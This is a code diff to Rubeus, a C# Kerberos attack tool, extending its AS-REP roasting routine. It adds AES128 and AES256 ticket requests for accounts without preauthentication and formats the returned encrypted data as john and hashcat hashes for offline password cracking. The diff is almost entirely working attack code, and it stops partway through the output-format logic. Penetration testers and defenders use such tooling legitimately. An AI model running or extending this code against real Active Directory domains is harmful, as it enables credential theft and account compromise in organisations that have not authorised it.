@@ -13,7 +13,7 @@ namespace Rubeus
 {
     public class Roast
     {
-        public static void ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", string format = "john", System.Net.NetworkCredential cred = null, string outFile = "", string ldapFilter = "", bool ldaps = false)
+        public static void ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", string format = "john", System.Net.NetworkCredential cred = null, string outFile = "", string ldapFilter = "", bool ldaps = false, string supportedEType = "rc4")
         {
             if (!String.IsNullOrEmpty(userName))
             {
@@ -37,7 +37,7 @@ namespace Rubeus
             if (!String.IsNullOrEmpty(userName) && !String.IsNullOrEmpty(domain) && !String.IsNullOrEmpty(domainController))
             {
                 // if we have a username, domain, and DC specified, we don't need to search for users and can roast directly
-                GetASRepHash(userName, domain, domainController, format, outFile);
+                GetASRepHash(userName, domain, domainController, format, outFile, supportedEType);
             }
             else
             {
@@ -79,7 +79,7 @@ namespace Rubeus
                     Console.WriteLine("[*] SamAccountName         : {0}", samAccountName);
                     Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
 
-                    GetASRepHash(samAccountName, domain, domainController, format, outFile);
+                    GetASRepHash(samAccountName, domain, domainController, format, outFile, supportedEType);
                 }
             }
 
@@ -89,7 +89,7 @@ namespace Rubeus
             }
         }
 
-        public static void GetASRepHash(string userName, string domain, string domainController = "", string format = "", string outFile = "")
+        public static void GetASRepHash(string userName, string domain, string domainController = "", string format = "", string outFile = "", string supportedEType = "rc4")
         {
             // roast AS-REPs for users without pre-authentication enabled
 
@@ -97,21 +97,82 @@ namespace Rubeus
             if (String.IsNullOrEmpty(dcIP)) { return; }
 
             Console.WriteLine("[*] Building AS-REQ (w/o preauth) for: '{0}\\{1}'", domain, userName);
-            byte[] reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.rc4_hmac).Encode().Encode();
 
-            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);
-            if (response == null)
+            byte[] reqBytes;
+            byte[] response;
+            AsnElt responseAsn;
+            int responseTag;
+            string requestedEType;
+
+            // Specify RC4 as the encryption type by default, unless the /aes flag was provided
+            if (supportedEType == "rc4")
             {
+                reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.rc4_hmac).Encode().Encode();
+                response = Networking.SendBytes(dcIP, 88, reqBytes);
+
+                if (response == null)
+                {
+                    return;
+                }
+
+                requestedEType = "rc4";
+
+                // decode the supplied bytes to an AsnElt object
+                //  false == ignore trailing garbage
+                responseAsn = AsnElt.Decode(response, false);
+
+                // check the response value
+                responseTag = responseAsn.TagValue;
+            }
+            else if (supportedEType == "aes")
+            {
+                Console.WriteLine("[*] Requesting AES128 (etype 17) as the encryption type");
+
+                // Attempt to use SHA128 (etype 17) first, then fall back to SHA256 (etype 18) if that doesn't work
+                reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.aes128_cts_hmac_sha1).Encode().Encode();
+                response = Networking.SendBytes(dcIP, 88, reqBytes);
+
+                if (response == null)
+                {
+                    return;
+                }
+
+                requestedEType = "aes128";
+
+                responseAsn = AsnElt.Decode(response, false);
+                responseTag = responseAsn.TagValue;
+
+                if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
+                {
+                    // parse the response to an KRB-ERROR
+                    KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
+
+                    // Error code 14 (KDC_ERR_ETYPE_NOTSUPP) means that AES128 (etype 17) is not supported, try AES256 (etype 18) next
+                    if (error.error_code == 14)
+                    {
+                        Console.WriteLine("[*] AES128 (etype 17) is not supported, attempting AES256 (etype 18) next");
+
+                        reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.aes256_cts_hmac_sha1).Encode().Encode();
+                        response = Networking.SendBytes(dcIP, 88, reqBytes);
+
+                        if (response == null)
+                        {
+                            return;
+                        }
+
+                        requestedEType = "aes256";
+
+                        responseAsn = AsnElt.Decode(response, false);
+                        responseTag = responseAsn.TagValue;
+                    }
+                }
+            }
+            else
+            {
+                Console.WriteLine("No supported encryption types provided");
                 return;
             }
-
-            // decode the supplied bytes to an AsnElt object
-            //  false == ignore trailing garbage
-            AsnElt responseAsn = AsnElt.Decode(response, false);
-
-            // check the response value
-            int responseTag = responseAsn.TagValue;
-
+            
             if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
             {
                 Console.WriteLine("[+] AS-REQ w/o preauth successful!");
@@ -121,16 +182,45 @@ namespace Rubeus
 
                 // output the hash of the encrypted KERB-CRED in a crackable hash form
                 string repHash = BitConverter.ToString(rep.enc_part.cipher).Replace("-", string.Empty);
-                repHash = repHash.Insert(32, "$");
 
                 string hashString = "";
+                int checksumStart;
+
                 if (format == "john")
                 {
-                    hashString = String.Format("$krb5asrep${0}@{1}:{2}", userName, domain, repHash);
+                    if (requestedEType == "aes128")
+                    {
+                        checksumStart = repHash.Length - 24;
+                        hashString = String.Format("$krb5asrep$17${0}{1}${2}${3}", domain.ToUpper(), userName, repHash.Substring(0, checksumStart), repHash.Substring(checksumStart));
+                    }
+                    else if (requestedEType == "aes256")
+                    {
+                        checksumStart = repHash.Length - 24;
+                        hashString = String.Format("$krb5asrep$18${0}{1}${2}${3}", domain.ToUpper(), userName, repHash.Substring(0, checksumStart), repHash.Substring(checksumStart));
+                    }
+                    else
+                    {
+                        repHash = repHash.Insert(32, "$");
+                        hashString = String.Format("$krb5asrep${0}@{1}:{2}", userName, domain, repHash);
+                    }
                 }
                 else if (format == "hashcat")
                 {
-                    hashString = String.Format("$krb5asrep$23${0}@{1}:{2}", userName, domain, repHash);
+                    if (requestedEType == "aes128")
+                    {
+                        checksumStart = repHash.Length - 24;
+                        hashString = String.Format("$krb5asrep$17${0}${1}${2}${3}", userName, domain, repHash.Substring(checksumStart), repHash.Substring(0, checksumStart));
+                    }
+                    else if (requestedEType == "aes256")
+                    {
+                        checksumStart = repHash.Length - 24;
+                        hashString = String.Format("$krb5asrep$18${0}${1}${2}${3}", userName, domain, repHash.Substring(checksumStart), repHash.Substring(0, checksumStart));
+                    }
+                    else
+                    {
+                        repHash = repHash.Insert(32, "$");
+                        hashString = String.Format("$krb5asrep$23${0}@{1}:{2}", userName, domain, repHash);
+                    }
                 }
                 else
                 {
